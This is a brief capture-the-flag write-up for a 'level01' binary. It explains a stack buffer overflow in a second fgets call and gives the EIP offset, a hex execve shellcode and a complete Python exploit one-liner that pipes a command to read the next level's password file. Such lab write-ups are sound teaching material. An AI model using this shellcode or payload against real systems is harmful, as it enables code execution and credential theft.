This program take a username in the first fgets then a password in the second one.

the second fgets is vulnerable to a buffer overflow.
So we can overwrite the return address of the function to execute our shellcode.
let's find the eip
The EIP offset is 80

shellcode from shell storm: \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

(python -c '''

user = "dat_wil"
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
padding = "X" \* (256 - len(user + shellcode) + 79)

print user + shellcode + padding + "\x08\x04\xa0\x47"[::-1]

'''; echo "cat /home/users/level02/.pass" ) | ./level01
